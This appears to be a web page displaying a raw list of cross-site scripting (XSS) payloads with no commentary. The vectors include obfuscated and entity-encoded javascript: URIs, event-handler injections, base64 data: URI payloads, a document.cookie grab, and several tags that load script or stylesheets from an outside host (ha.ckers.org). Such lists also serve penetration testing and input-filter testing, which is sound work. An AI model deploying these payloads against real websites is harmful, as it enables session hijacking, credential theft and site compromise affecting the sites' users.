&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe
&lt;script x&gt; alert(1) &lt;/script 1=2
&lt;div/onmouseover='alert(1)'&gt; style="x:"&gt;
&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;
 &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;
&lt;div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)"&gt;x&lt;/button&gt;
"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;
&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME
&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;
&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;
&lt;a href="data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203"&gt;Click Me&lt;/a&gt;
&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)&lt;/SCRIPT&gt;
‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt;IMG “””&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
&lt;IMG SRC=”jav&amp;#x09;ascript:alert(‘XSS’);”&gt;
&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;
%253cscript%253ealert(1)%253c/script%253e
“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;
foo&lt;script&gt;alert(1)&lt;/script&gt;
&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;
&lt;BODY ONLOAD=alert(‘XSS’)&gt;
&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”&gt;
&lt;IMG SRC=”javascript:alert(‘XSS’)”
&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
javascript:alert("hellox worldss")
&lt;img src="javascript:alert('XSS');"&gt;
&lt;img src=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
&lt;SCRIPT a="&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a="&gt;" '' SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT "a='&gt;'" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a="&gt;'&gt;" SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
&lt;"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;?/SCRIPT&gt;&amp;submit.x=27&amp;submit.y=9&amp;cmd=search
&lt;script&gt;alert("hellox worldss")&lt;/script&gt;&amp;safe=high&amp;cx=006665157904466893121:su_tzknyxug&amp;cof=FORID:9#510
&lt;script&gt;alert("XSS");&lt;/script&gt;&amp;search=1
0&amp;q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83%?2C83))&lt;/SCRIPT&gt;&amp;submit-frmGoogleWeb=Web+Search
&lt;h1&gt;&lt;font color=blue&gt;hellox worldss&lt;/h1&gt;
&lt;BODY ONLOAD=alert('hellox worldss')&gt;
&lt;input onfocus=write(XSS) autofocus&gt;
&lt;input onblur=write(XSS) autofocus&gt;&lt;input autofocus&gt;
&lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
&lt;form&gt;&lt;button formaction="javascript:alert(XSS)"&gt;lol
&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=alert(XSS)//"&gt;
&lt;![&gt;&lt;img src="]&gt;&lt;img src=x onerror=alert(XSS)//"&gt;
&lt;style&gt;&lt;img src="&lt;/style&gt;&lt;img src=x onerror=alert(XSS)//"&gt;
&lt;? foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;! foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;/ foo="&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;? foo="&gt;&lt;x foo='?&gt;&lt;script&gt;alert(1)&lt;/script&gt;'&gt;"&gt;
&lt;! foo="[[[Inception]]"&gt;&lt;x foo="]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;% foo&gt;&lt;x foo="%&gt;&lt;script&gt;alert(123)&lt;/script&gt;"&gt;
&lt;div style="font-family:'foo&amp;#10;;color:red;';"&gt;LOL
LOL&lt;style&gt;*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}&lt;/style&gt;
&lt;script&gt;({0:#0=alert/#0#/#0#(0)})&lt;/script&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;LOL&lt;script&gt;alert(123)&lt;/script&gt;&lt;/svg&gt;
&amp;lt;SCRIPT&amp;gt;alert(/XSS/&amp;#46;source)&amp;lt;/SCRIPT&amp;gt;
\\";alert('XSS');//
&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\"XSS\");&amp;lt;/SCRIPT&amp;gt;
&amp;lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&amp;#058;alert('XSS');\"&amp;gt;
&amp;lt;BODY BACKGROUND=\"javascript&amp;#058;alert('XSS')\"&amp;gt;
&amp;lt;BODY ONLOAD=alert('XSS')&amp;gt;
&amp;lt;IMG DYNSRC=\"javascript&amp;#058;alert('XSS')\"&amp;gt;
&amp;lt;IMG LOWSRC=\"javascript&amp;#058;alert('XSS')\"&amp;gt;
&amp;lt;BGSOUND SRC=\"javascript&amp;#058;alert('XSS');\"&amp;gt;
&amp;lt;BR SIZE=\"&amp;{alert('XSS')}\"&amp;gt;
&amp;lt;LAYER SRC=\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\"&amp;gt;&amp;lt;/LAYER&amp;gt;
&amp;lt;LINK REL=\"stylesheet\" HREF=\"javascript&amp;#058;alert('XSS');\"&amp;gt;
&amp;lt;LINK REL=\"stylesheet\" HREF=\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css\"&amp;gt;
&amp;lt;STYLE&amp;gt;@import'http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css';&amp;lt;/STYLE&amp;gt;
&amp;lt;META HTTP-EQUIV=\"Link\" Content=\"&amp;lt;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&amp;gt;; REL=stylesheet\"&amp;gt;
&amp;lt;STYLE&amp;gt;BODY{-moz-binding&amp;#58;url(\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xssmoz&amp;#46;xml#xss\")}&amp;lt;/STYLE&amp;gt;
&amp;lt;XSS STYLE=\"behavior&amp;#58; url(xss&amp;#46;htc);\"&amp;gt;
&amp;lt;STYLE&amp;gt;li {list-style-image&amp;#58; url(\"javascript&amp;#058;alert('XSS')\");}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS
&amp;lt;IMG SRC='vbscript&amp;#058;msgbox(\"XSS\")'&amp;gt;
&amp;lt;IMG SRC=\"mocha&amp;#58;&amp;#91;code&amp;#93;\"&amp;gt;
&amp;lt;IMG SRC=\"livescript&amp;#058;&amp;#91;code&amp;#93;\"&amp;gt;
žscriptualert(EXSSE)ž/scriptu
&amp;lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&amp;#058;alert('XSS');\"&amp;gt;
&amp;lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&amp;#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&amp;gt;
&amp;lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&amp;#58;//;URL=javascript&amp;#058;alert('XSS');\"
&amp;lt;IFRAME SRC=\"javascript&amp;#058;alert('XSS');\"&amp;gt;&amp;lt;/IFRAME&amp;gt;
&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=\"javascript&amp;#058;alert('XSS');\"&amp;gt;&amp;lt;/FRAMESET&amp;gt;
&amp;lt;TABLE BACKGROUND=\"javascript&amp;#058;alert('XSS')\"&amp;gt;
&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=\"javascript&amp;#058;alert('XSS')\"&amp;gt;
&amp;lt;DIV STYLE=\"background-image&amp;#58; url(javascript&amp;#058;alert('XSS'))\"&amp;gt;
&amp;lt;DIV STYLE=\"background-image&amp;#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&amp;#46;1027\0058&amp;#46;1053\0053\0027\0029'\0029\"&amp;gt;
&amp;lt;DIV STYLE=\"background-image&amp;#58; url(javascript&amp;#058;alert('XSS'))\"&amp;gt;
&amp;lt;DIV STYLE=\"width&amp;#58; expression(alert('XSS'));\"&amp;gt;
&amp;lt;STYLE&amp;gt;@im\port'\ja\vasc\ript&amp;#58;alert(\"XSS\")';&amp;lt;/STYLE&amp;gt;
&amp;lt;IMG STYLE=\"xss&amp;#58;expr/*XSS*/ession(alert('XSS'))\"&amp;gt;
&amp;lt;XSS STYLE=\"xss&amp;#58;expression(alert('XSS'))\"&amp;gt;
exp/*&amp;lt;A STYLE='no\xss&amp;#58;noxss(\"*//*\");
xss&amp;#58;ex&amp;#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&amp;gt;
&amp;lt;STYLE TYPE=\"text/javascript\"&amp;gt;alert('XSS');&amp;lt;/STYLE&amp;gt;
&amp;lt;STYLE&amp;gt;&amp;#46;XSS{background-image&amp;#58;url(\"javascript&amp;#058;alert('XSS')\");}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt;
&amp;lt;STYLE type=\"text/css\"&amp;gt;BODY{background&amp;#58;url(\"javascript&amp;#058;alert('XSS')\")}&amp;lt;/STYLE&amp;gt;
&amp;lt;!--&amp;#91;if gte IE 4&amp;#93;&amp;gt;
&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;
&amp;lt;!&amp;#91;endif&amp;#93;--&amp;gt;
&amp;lt;BASE HREF=\"javascript&amp;#058;alert('XSS');//\"&amp;gt;
&amp;lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\"&amp;gt;&amp;lt;/OBJECT&amp;gt;
&amp;lt;OBJECT classid=clsid&amp;#58;ae24fdae-03c6-11d1-8b76-0080c744f389&amp;gt;&amp;lt;param name=url value=javascript&amp;#058;alert('XSS')&amp;gt;&amp;lt;/OBJECT&amp;gt;
&amp;lt;EMBED SRC=\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;swf\" AllowScriptAccess=\"always\"&amp;gt;&amp;lt;/EMBED&amp;gt;
&amp;lt;EMBED SRC=\"data&amp;#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZH"
</pre>
    </code>
    </main>
  </section>
    
    <script src="./javascript/script.js"></script>
  </body>
</html>
